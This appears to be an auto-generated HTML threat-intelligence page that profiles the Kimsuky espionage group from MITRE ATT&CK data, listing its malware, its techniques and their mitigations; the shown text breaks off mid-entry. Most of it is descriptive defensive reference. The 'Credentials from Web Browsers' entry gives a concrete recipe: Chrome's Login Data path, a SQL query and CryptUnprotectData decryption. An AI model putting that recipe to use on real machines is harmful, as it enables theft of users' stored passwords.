
        <!DOCTYPE html>
        <html style="font-size: 16px;">
          <head>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <meta charset="utf-8">
            <meta name="keywords" content="90+%, 89% - 80%, 79% - 70%, 69% - 60%, 59% - 50%, APT Name, Description, Associated Groups, Software, Techniques">
            <meta name="description" content="">
            <meta name="page_type" content="np-template-header-footer-from-plugin"><title>G0094</title>
            <link rel="stylesheet" href="nicepage.css" media="screen">
        <link rel="stylesheet" href="groupPage.css" media="screen">
            <script class="u-script" type="text/javascript" src="jquery.js" defer=""></script>
            <script class="u-script" type="text/javascript" src="nicepage.js" defer=""></script>
            <meta name="generator" content="Nicepage 4.8.2, nicepage.com">
            <link id="u-theme-google-font" rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:100,100i,300,300i,400,400i,500,500i,700,700i,900,900i|Open+Sans:300,300i,400,400i,500,500i,600,600i,700,700i,800,800i">
            
            
            <script type="application/ld+json">{
                        "@context": "http://schema.org",
                        "@type": "Organization",
                        "name": "",
                        "logo": "images/raptor.png",
                        "sameAs": [
                                        "https://github.com/redbeardmeric/APTAnalyzer",
                                        "https://attack.mitre.org/"
                        ]
        }</script>
            <meta name="theme-color" content="#478ac9"><meta property="og:title" content="G0094">
            <meta property="og:type" content="website">
          </head>
          <body class="u-body u-xl-mode"><header class="u-border-3 u-border-custom-color-1 u-clearfix u-header u-header" id="sec-2f7b"><div class="u-clearfix u-sheet u-valign-middle u-sheet-1">
                <a href="https://nicepage.com" class="u-image u-logo u-image-1" data-image-width="256" data-image-height="256">
                  <img src="images/raptor.png" class="u-logo-image u-logo-image-1">
                </a>
                <nav class="u-menu u-menu-dropdown u-offcanvas u-menu-1">
                  <div class="menu-collapse" style="font-size: 1rem; letter-spacing: 0px;">
                    <a class="u-button-style u-custom-left-right-menu-spacing u-custom-padding-bottom u-custom-text-active-color u-custom-text-color u-custom-text-hover-color u-custom-top-bottom-menu-spacing u-nav-link u-text-active-palette-1-base u-text-hover-palette-2-base" href="#">
                      <svg class="u-svg-link" viewBox="0 0 24 24"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#menu-hamburger"></use></svg>
                      <svg class="u-svg-content" version="1.1" id="menu-hamburger" viewBox="0 0 16 16" x="0px" y="0px" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns="http://www.w3.org/2000/svg"><g><rect y="1" width="16" height="2"></rect><rect y="7" width="16" height="2"></rect><rect y="13" width="16" height="2"></rect>
        </g></svg>
                    </a>
                  </div>
                  <div class="u-custom-menu u-nav-container">
                    <ul class="u-nav u-unstyled u-nav-1"><li class="u-nav-item"><a class="u-button-style u-nav-link u-text-active-white u-text-custom-color-1 u-text-hover-white" href="Home.html" style="padding: 10px 20px;">Home</a>
        </li><li class="u-nav-item"><a class="u-button-style u-nav-link u-text-active-white u-text-custom-color-1 u-text-hover-white" href="About.html" style="padding: 10px 20px;">About</a>
        </li></ul>
                  </div>
                  <div class="u-custom-menu u-nav-container-collapse">
                    <div class="u-black u-container-style u-inner-container-layout u-opacity u-opacity-95 u-sidenav">
                      <div class="u-inner-container-layout u-sidenav-overflow">
                        <div class="u-menu-close"></div>
                        <ul class="u-align-center u-nav u-popupmenu-items u-unstyled u-nav-2"><li class="u-nav-item"><a class="u-button-style u-nav-link" href="Home.html">Home</a>
        </li><li class="u-nav-item"><a class="u-button-style u-nav-link" href="About.html">About</a>
        </li></ul>
                      </div>
                    </div>
                    <div class="u-black u-menu-overlay u-opacity u-opacity-70"></div>
                  </div>
                </nav>
              </div></header>
            <section class="u-align-center u-clearfix u-grey-5 u-section-1" id="sec-c48b">
              <div class="u-clearfix u-expanded-width u-layout-wrap u-layout-wrap-1">
                <div class="u-layout">
                  <div class="u-layout-row">
                    <div class="u-black u-container-style u-layout-cell u-size-15 u-layout-cell-1">
                      <div class="u-border-3 u-border-custom-color-1 u-container-layout u-container-layout-1"><h2 class="u-align-center u-subtitle u-text u-text-custom-color-1 u-text-1">90+%</h2><a href="G0094.html" data-page-id="G0094" class="u-border-1 u-border-active-custom-color-1 u-border-hover-custom-color-1 u-btn u-button-style u-none u-text-custom-color-1 u-btn-1">Kimsuky</a><h2 class="u-align-center u-subtitle u-text u-text-custom-color-1 u-text-2">89% - 80%</h2><h2 class="u-align-center u-subtitle u-text u-text-custom-color-1 u-text-3">79% - 70%</h2><h2 class="u-align-center u-subtitle u-text u-text-custom-color-1 u-text-4">69% - 60%</h2><h2 class="u-align-center u-subtitle u-text u-text-custom-color-1 u-text-5">59% - 50%</h2>
                      </div>
                    </div>
                    <div class="u-black u-container-style u-layout-cell u-size-45 u-layout-cell-2">
                      <div class="u-border-3 u-border-custom-color-1 u-container-layout u-container-layout-2">
                        <h1 class="u-align-left u-text u-text-custom-color-1 u-title u-text-6">Kimsuky</h1>
                        <p class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-8"><a href="https://attack.mitre.org/groups/G0094">Kimsuky</a> is a North Korea-based cyber espionage group that has been active since at least 2012. The group initially focused on targeting South Korean government entities, think tanks, and individuals identified as experts in various fields, and expanded its operations to include the United States, Russia, Europe, and the UN. <a href="https://attack.mitre.org/groups/G0094">Kimsuky</a> has focused its intelligence collection activities on foreign policy and national security issues related to the Korean peninsula, nuclear policy, and sanctions.

<a href="https://attack.mitre.org/groups/G0094">Kimsuky</a> was assessed to be responsible for the 2014 Korea Hydro & Nuclear Power Co. compromise; other notable campaigns include Operation STOLEN PENCIL (2018), Operation Kabar Cobra (2019), and Operation Smoke Screen (2019).

North Korean group definitions are known to have significant overlap, and some security researchers report all North Korean state-sponsored cyber activity under the name <a href="https://attack.mitre.org/groups/G0032">Lazarus Group</a> instead of tracking clusters or subgroups.</p>
                        <h2 class="u-align-left u-subtitle u-text u-text-custom-color-1 u-text-default u-text-9">Associated Groups</h2>
                        <p class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-10">Black Banshee, STOLEN PENCIL, Thallium, Velvet Chollima</p>
                         <details>
                             <summary><h2 class="u-align-left u-subtitle u-text u-text-custom-color-1 u-text-default u-text-9">Software</h2></summary>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9 style="padding-left: 15px;"><span style="padding-left: 20px; display:block">AppleSeed</span></summary>
                            <p><span style="padding-left: 40px; display:block"><a href="https://attack.mitre.org/software/S0622">AppleSeed</a> is a backdoor that has been used by <a href="https://attack.mitre.org/groups/G0094">Kimsuky</a> to target South Korean government, academic, and commercial  targets since at least 2021.</span></p>
                        </details>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9 style="padding-left: 15px;"><span style="padding-left: 20px; display:block">BabyShark</span></summary>
                            <p><span style="padding-left: 40px; display:block"><a href="https://attack.mitre.org/software/S0414">BabyShark</a> is a Microsoft Visual Basic (VB) script-based malware family that is believed to be associated with several North Korean campaigns. </span></p>
                        </details>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9 style="padding-left: 15px;"><span style="padding-left: 20px; display:block">CSPY Downloader</span></summary>
                            <p><span style="padding-left: 40px; display:block"><a href="https://attack.mitre.org/software/S0527">CSPY Downloader</a> is a tool designed to evade analysis and download additional payloads used by <a href="https://attack.mitre.org/groups/G0094">Kimsuky</a>.</span></p>
                        </details>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9 style="padding-left: 15px;"><span style="padding-left: 20px; display:block">KGH_SPY</span></summary>
                            <p><span style="padding-left: 40px; display:block"><a href="https://attack.mitre.org/software/S0526">KGH_SPY</a> is a modular suite of tools used by <a href="https://attack.mitre.org/groups/G0094">Kimsuky</a> for reconnaissance, information stealing, and backdoor capabilities. <a href="https://attack.mitre.org/software/S0526">KGH_SPY</a> derived its name from PDB paths and internal names found in samples containing "KGH".</span></p>
                        </details>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9 style="padding-left: 15px;"><span style="padding-left: 20px; display:block">Mimikatz</span></summary>
                            <p><span style="padding-left: 40px; display:block"><a href="https://attack.mitre.org/software/S0002">Mimikatz</a> is a credential dumper capable of obtaining plaintext Windows account logins and passwords, along with many other features that make it useful for testing the security of networks.  </span></p>
                        </details>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9 style="padding-left: 15px;"><span style="padding-left: 20px; display:block">NOKKI</span></summary>
                            <p><span style="padding-left: 40px; display:block"><a href="https://attack.mitre.org/software/S0353">NOKKI</a> is a modular remote access tool. The earliest observed attack using <a href="https://attack.mitre.org/software/S0353">NOKKI</a> was in January 2018. <a href="https://attack.mitre.org/software/S0353">NOKKI</a> has significant code overlap with the <a href="https://attack.mitre.org/software/S0356">KONNI</a> malware family. There is some evidence potentially linking <a href="https://attack.mitre.org/software/S0353">NOKKI</a> to <a href="https://attack.mitre.org/groups/G0067">APT37</a>.</span></p>
                        </details>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9 style="padding-left: 15px;"><span style="padding-left: 20px; display:block">PsExec</span></summary>
                            <p><span style="padding-left: 40px; display:block"><a href="https://attack.mitre.org/software/S0029">PsExec</a> is a free Microsoft tool that can be used to execute a program on another computer. It is used by IT administrators and attackers.  </span></p>
                        </details>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9 style="padding-left: 15px;"><span style="padding-left: 20px; display:block">schtasks</span></summary>
                            <p><span style="padding-left: 40px; display:block"><a href="https://attack.mitre.org/software/S0111">schtasks</a> is used to schedule execution of programs or scripts on a Windows system to run at a specific date and time. </span></p>
                        </details></details>
                   <details>
                     <summary><h2 class="u-align-left u-subtitle u-text u-text-custom-color-1 u-text-default u-text-9">Techniques</h2></summary>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9"><h5 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 20px; display:block">Adversary-in-the-Middle</span></h5></summary>
                            <p><span style="padding-left: 40px; display:block">Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as <a href="https://attack.mitre.org/techniques/T1040">Network Sniffing</a> or <a href="https://attack.mitre.org/techniques/T1565/002">Transmitted Data Manipulation</a>. By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.

Adversaries may leverage the AiTM position to attempt to modify traffic, such as in <a href="https://attack.mitre.org/techniques/T1565/002">Transmitted Data Manipulation</a>. Adversaries can also stop traffic from flowing to the appropriate destination, causing denial of service.</span></p>
                    <details>
                        <summary><h6 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 60px; display:block">Mitigations</span></h6></summary>
                            <p><span style="padding-left: 80px; display:block">Disable or Remove Feature or Program - Remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.</span></p>
                            <p><span style="padding-left: 80px; display:block">Encrypt Sensitive Information - Protect sensitive information with strong encryption.</span></p>
                            <p><span style="padding-left: 80px; display:block">Filter Network Traffic - Use network appliances to filter ingress or egress traffic and perform protocol-based filtering. Configure software on endpoints to filter network traffic.</span></p>
                            <p><span style="padding-left: 80px; display:block">Limit Access to Resource Over Network - Prevent access to file shares, remote access to systems, unnecessary services. Mechanisms to limit access may include use of network concentrators, RDP gateways, etc.</span></p>
                            <p><span style="padding-left: 80px; display:block">Network Intrusion Prevention - Use intrusion detection signatures to block traffic at network boundaries.</span></p>
                            <p><span style="padding-left: 80px; display:block">Network Segmentation - Architect sections of the network to isolate critical systems, functions, or resources. Use physical and logical segmentation to prevent access to potentially sensitive systems and information. Use a DMZ to contain any internet-facing services that should not be exposed from the internal network. Configure separate virtual private cloud (VPC) instances to isolate critical cloud systems.</span></p>
                            <p><span style="padding-left: 80px; display:block">User Training - Train users to be aware of access or manipulation attempts by an adversary to reduce the risk of successful spearphishing, social engineering, and other techniques that involve user interaction.</span></p></details>
                        </details>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9"><h5 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 20px; display:block">Archive Collected Data: Archive via Custom Method</span></h5></summary>
                            <p><span style="padding-left: 40px; display:block">An adversary may compress or encrypt data that is collected prior to exfiltration using a custom method. Adversaries may choose to use custom archival methods, such as encryption with XOR or stream ciphers implemented with no external library or utility references. Custom implementations of well-known compression algorithms have also been used.</span></p></details>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9"><h5 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 20px; display:block">Browser Extensions</span></h5></summary>
                            <p><span style="padding-left: 40px; display:block">Adversaries may abuse Internet browser extensions to establish persistent access to victim systems. Browser extensions or plugins are small programs that can add functionality and customize aspects of Internet browsers. They can be installed directly or through a browser's app store and generally have access and permissions to everything that the browser can access.

Malicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system. Security can be limited on browser app stores so it may not be difficult for malicious extensions to defeat automated scanners. Depending on the browser, adversaries may also manipulate an extension's update url to install updates from an adversary controlled server or manipulate the mobile configuration file to silently install additional extensions.

Previous to macOS 11, adversaries could silently install browser extensions via the command line using the <code>profiles</code> tool to install malicious <code>.mobileconfig</code> files. In macOS 11+, the use of the <code>profiles</code> tool can no longer install configuration profiles, however <code>.mobileconfig</code> files can be planted and installed with user interaction.

Once the extension is installed, it can browse to websites in the background, steal all information that a user enters into a browser (including credentials) and be used as an installer for a RAT for persistence.

There have also been instances of botnets using a persistent backdoor through malicious Chrome extensions. There have also been similar examples of extensions being used for command & control.</span></p>
                    <details>
                        <summary><h6 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 60px; display:block">Mitigations</span></h6></summary>
                            <p><span style="padding-left: 80px; display:block">Audit - Perform audits or scans of systems, permissions, insecure software, insecure configurations, etc. to identify potential weaknesses.</span></p>
                            <p><span style="padding-left: 80px; display:block">Execution Prevention - Block execution of code on a system through application control, and/or script blocking.</span></p>
                            <p><span style="padding-left: 80px; display:block">Limit Software Installation - Block users or groups from installing unapproved software.</span></p>
                            <p><span style="padding-left: 80px; display:block">Update Software - Perform regular software updates to mitigate exploitation risk.</span></p>
                            <p><span style="padding-left: 80px; display:block">User Training - Train users to be aware of access or manipulation attempts by an adversary to reduce the risk of successful spearphishing, social engineering, and other techniques that involve user interaction.</span></p></details>
                        </details>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9"><h5 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 20px; display:block">Event Triggered Execution: Change Default File Association</span></h5></summary>
                            <p><span style="padding-left: 40px; display:block">Adversaries may establish persistence by executing malicious content triggered by a file type association. When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access   or by administrators using the built-in assoc utility.  Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.

System file associations are listed under <code>HKEY_CLASSES_ROOT\.[extension]</code>, for example <code>HKEY_CLASSES_ROOT\.txt</code>. The entries point to a handler for that extension located at <code>HKEY_CLASSES_ROOT\[handler]</code>. The various commands are then listed as subkeys underneath the shell key at <code>HKEY_CLASSES_ROOT\[handler]\shell\[action]\command</code>. For example: 
* <code>HKEY_CLASSES_ROOT\txtfile\shell\open\command</code>
* <code>HKEY_CLASSES_ROOT\txtfile\shell\print\command</code>
* <code>HKEY_CLASSES_ROOT\txtfile\shell\printto\command</code>

The values of the keys listed are commands that are executed when the handler opens the file extension. Adversaries can modify these values to continually execute arbitrary commands. </span></p></details>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9"><h5 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 20px; display:block">Subvert Trust Controls: Code Signing</span></h5></summary>
                            <p><span style="padding-left: 40px; display:block">Adversaries may create, acquire, or steal code signing materials to sign their malware or tools. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with.  The certificates used during an operation may be created, acquired, or stolen by the adversary.   Unlike <a href="https://attack.mitre.org/techniques/T1036/001">Invalid Code Signature</a>, this activity will result in a valid signature.

Code signing to verify software on first run can be used on modern Windows and macOS/OS X systems. It is not used on Linux due to the decentralized nature of the platform.  

Code signing certificates may be used to bypass security policies that require signed code to execute on a system. </span></p></details>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9"><h5 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 20px; display:block">Unsecured Credentials: Credentials In Files</span></h5></summary>
                            <p><span style="padding-left: 40px; display:block">Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.

It is possible to extract passwords from backups or saved virtual machines through <a href="https://attack.mitre.org/techniques/T1003">OS Credential Dumping</a>.  Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller. 

In cloud and/or containerized environments, authenticated user and service account credentials are often stored in local configuration and credential files. They may also be found as parameters to deployment commands in container logs. In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files.</span></p>
                    <details>
                        <summary><h6 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 60px; display:block">Mitigations</span></h6></summary>
                            <p><span style="padding-left: 80px; display:block">Audit - Perform audits or scans of systems, permissions, insecure software, insecure configurations, etc. to identify potential weaknesses.</span></p>
                            <p><span style="padding-left: 80px; display:block">Password Policies - Set and enforce secure password policies for accounts.</span></p>
                            <p><span style="padding-left: 80px; display:block">Restrict File and Directory Permissions - Restrict access by setting directory and file permissions that are not specific to users or privileged accounts.</span></p>
                            <p><span style="padding-left: 80px; display:block">User Training - Train users to be aware of access or manipulation attempts by an adversary to reduce the risk of successful spearphishing, social engineering, and other techniques that involve user interaction.</span></p></details>
                        </details>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9"><h5 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 20px; display:block">Credentials from Password Stores: Credentials from Web Browsers</span></h5></summary>
                            <p><span style="padding-left: 40px; display:block">Adversaries may acquire credentials from web browsers by reading files specific to the target browser. Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.

For example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, <code>AppData\Local\Google\Chrome\User Data\Default\Login Data</code> and executing a SQL query: <code>SELECT action_url, username_value, password_value FROM logins;</code>. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function <code>CryptUnprotectData</code>, which uses the victim’s cached logon credentials as the decryption key. 
 
Adversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc. Windows stores Internet Explorer and Microsoft Edge credentials in Credential Lockers managed by the <a href="https://attack.mitre.org/techniques/T1555/004">Windows Credential Manager</a>.

Adversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.

After acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).</span></p>
                    <details>
                        <summary><h6 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 60px; display:block">Mitigations</span></h6></summary>
                            <p><span style="padding-left: 80px; display:block">Password Policies - Set and enforce secure password policies for accounts.</span></p></details>
                        </details>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9"><h5 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 20px; display:block">Data from Local System</span></h5></summary>
                            <p><span style="padding-left: 40px; display:block">Adversaries may search local system sources, such as file systems or local databases, to find files of interest and sensitive data prior to Exfiltration.

Adversaries may do this using a <a href="https://attack.mitre.org/techniques/T1059">Command and Scripting Interpreter</a>, such as <a href="https://attack.mitre.org/software/S0106">cmd</a>, which has functionality to interact with the file system to gather information. Some adversaries may also use <a href="https://attack.mitre.org/techniques/T1119">Automated Collection</a> on the local system.
</span></p>
                    <details>
                        <summary><h6 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 60px; display:block">Mitigations</span></h6></summary>
                            <p><span style="padding-left: 80px; display:block">Data Loss Prevention - Use a data loss prevention (DLP) strategy to categorize sensitive data, identify data formats indicative of personal identifiable information (PII), and restrict exfiltration of sensitive data.</span></p></details>
                        </details>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9"><h5 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 20px; display:block">Develop Capabilities</span></h5></summary>
                            <p><span style="padding-left: 40px; display:block">Adversaries may build capabilities that can be used during targeting. Rather than purchasing, freely downloading, or stealing capabilities, adversaries may develop their own capabilities in-house. This is the process of identifying development requirements and building solutions such as malware, exploits, and self-signed certificates. Adversaries may develop capabilities to support their operations throughout numerous phases of the adversary lifecycle.

As with legitimate development efforts, different skill sets may be required for developing capabilities. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the capability.</span></p>
                    <details>
                        <summary><h6 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 60px; display:block">Mitigations</span></h6></summary>
                            <p><span style="padding-left: 80px; display:block">Pre-compromise - This category is used for any applicable mitigation activities that apply to techniques occurring before an adversary gains Initial Access, such as Reconnaissance and Resource Development techniques.</span></p></details>
                        </details>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9"><h5 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 20px; display:block">Impair Defenses: Disable or Modify System Firewall</span></h5></summary>
                            <p><span style="padding-left: 40px; display:block">Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.

Modifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. </span></p>
                    <details>
                        <summary><h6 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 60px; display:block">Mitigations</span></h6></summary>
                            <p><span style="padding-left: 80px; display:block">Restrict File and Directory Permissions - Restrict access by setting directory and file permissions that are not specific to users or privileged accounts.</span></p>
                            <p><span style="padding-left: 80px; display:block">Restrict Registry Permissions - Restrict the ability to modify certain hives or keys in the Windows Registry.</span></p>
                            <p><span style="padding-left: 80px; display:block">User Account Management - Manage the creation, modification, use, and permissions associated to user accounts.</span></p></details>
                        </details>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9"><h5 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 20px; display:block">Impair Defenses: Disable or Modify Tools</span></h5></summary>
                            <p><span style="padding-left: 40px; display:block">Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take the many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information.

Adversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to <a href="https://attack.mitre.org/techniques/T1562/006">Indicator Blocking</a>, adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.</span></p>
                    <details>
                        <summary><h6 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 60px; display:block">Mitigations</span></h6></summary>
                            <p><span style="padding-left: 80px; display:block">Restrict File and Directory Permissions - Restrict access by setting directory and file permissions that are not specific to users or privileged accounts.</span></p>
                            <p><span style="padding-left: 80px; display:block">Restrict Registry Permissions - Restrict the ability to modify certain hives or keys in the Windows Registry.</span></p>
                            <p><span style="padding-left: 80px; display:block">User Account Management - Manage the creation, modification, use, and permissions associated to user accounts.</span></p></details>
                        </details>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9"><h5 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 20px; display:block">Acquire Infrastructure: Domains</span></h5></summary>
                            <p><span style="padding-left: 40px; display:block">Adversaries may purchase domains that can be used during targeting. Domain names are the human readable names used to represent one or more IP addresses. They can be purchased or, in some cases, acquired for free.

Adversaries can use purchased domains for a variety of purposes, including for <a href="https://attack.mitre.org/techniques/T1566">Phishing</a>, <a href="https://attack.mitre.org/techniques/T1189">Drive-by Compromise</a>, and Command and Control. Adversaries may choose domains that are similar to legitimate domains, including through use of homoglyphs or use of a different top-level domain (TLD). Typosquatting may be used to aid in delivery of payloads via <a href="https://attack.mitre.org/techniques/T1189">Drive-by Compromise</a>. Adversaries can also use internationalized domain names (IDNs) to create visually similar lookalike domains for use in operations.

Domain registrars each maintain a publicly viewable database that displays contact information for every registered domain. Private WHOIS services display alternative information, such as their own company data, rather than the owner of the domain. Adversaries may use such private WHOIS services to obscure information about who owns a purchased domain. Adversaries may further interrupt efforts to track their infrastructure by using varied registration information and purchasing domains with different domain registrars.</span></p>
                    <details>
                        <summary><h6 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 60px; display:block">Mitigations</span></h6></summary>
                            <p><span style="padding-left: 80px; display:block">Pre-compromise - This category is used for any applicable mitigation activities that apply to techniques occurring before an adversary gains Initial Access, such as Reconnaissance and Resource Development techniques.</span></p></details>
                        </details>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9"><h5 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 20px; display:block">Compromise Accounts: Email Accounts</span></h5></summary>
                            <p><span style="padding-left: 40px; display:block">Adversaries may compromise email accounts that can be used during targeting. Adversaries can use compromised email accounts to further their operations, such as leveraging them to conduct <a href="https://attack.mitre.org/techniques/T1598">Phishing for Information</a> or <a href="https://attack.mitre.org/techniques/T1566">Phishing</a>. Utilizing an existing persona with a compromised email account may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. Compromised email accounts can also be used in the acquisition of infrastructure (ex: <a href="https://attack.mitre.org/techniques/T1583/001">Domains</a>).

A variety of methods exist for compromising email accounts, such as gathering credentials via <a href="https://attack.mitre.org/techniques/T1598">Phishing for Information</a>, purchasing credentials from third-party sites, or by brute forcing credentials (ex: password reuse from breach credential dumps). Prior to compromising email accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.

Adversaries can use a compromised email account to hijack existing email threads with targets of interest.</span></p>
                    <details>
                        <summary><h6 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 60px; display:block">Mitigations</span></h6></summary>
                            <p><span style="padding-left: 80px; display:block">Pre-compromise - This category is used for any applicable mitigation activities that apply to techniques occurring before an adversary gains Initial Access, such as Reconnaissance and Resource Development techniques.</span></p></details>
                        </details>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9"><h5 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 20px; display:block">Gather Victim Identity Information: Email Addresses</span></h5></summary>
                            <p><span style="padding-left: 40px; display:block">Adversaries may gather email addresses that can be used during targeting. Even if internal instances exist, organizations may have public-facing email infrastructure and addresses for employees.

Adversaries may easily gather email addresses, since they may be readily available and exposed via online or other accessible data sets (ex: <a href="https://attack.mitre.org/techniques/T1593/001">Social Media</a> or <a href="https://attack.mitre.org/techniques/T1594">Search Victim-Owned Websites</a>). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: <a href="https://attack.mitre.org/techniques/T1593">Search Open Websites/Domains</a> or <a href="https://attack.mitre.org/techniques/T1598">Phishing for Information</a>), establishing operational resources (ex: <a href="https://attack.mitre.org/techniques/T1586/002">Email Accounts</a>), and/or initial access (ex: <a href="https://attack.mitre.org/techniques/T1566">Phishing</a>).</span></p>
                    <details>
                        <summary><h6 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 60px; display:block">Mitigations</span></h6></summary>
                            <p><span style="padding-left: 80px; display:block">Pre-compromise - This category is used for any applicable mitigation activities that apply to techniques occurring before an adversary gains Initial Access, such as Reconnaissance and Resource Development techniques.</span></p></details>
                        </details>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9"><h5 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 20px; display:block">Email Collection: Email Forwarding Rule</span></h5></summary>
                            <p><span style="padding-left: 40px; display:block">Adversaries may setup email forwarding rules to collect sensitive information. Adversaries may abuse email-forwarding rules to monitor the activities of a victim, steal information, and further gain intelligence on the victim or the victim’s organization to use as part of further exploits or operations. Furthermore, email forwarding rules can allow adversaries to maintain persistent access to victim's emails even after compromised credentials are reset by administrators. Most email clients allow users to create inbox rules for various email functions, including forwarding to a different recipient. These rules may be created through a local email application, a web interface, or by command-line interface. Messages can be forwarded to internal or external recipients, and there are no restrictions limiting the extent of this rule. Administrators may also create forwarding rules for user accounts with the same considerations and outcomes.

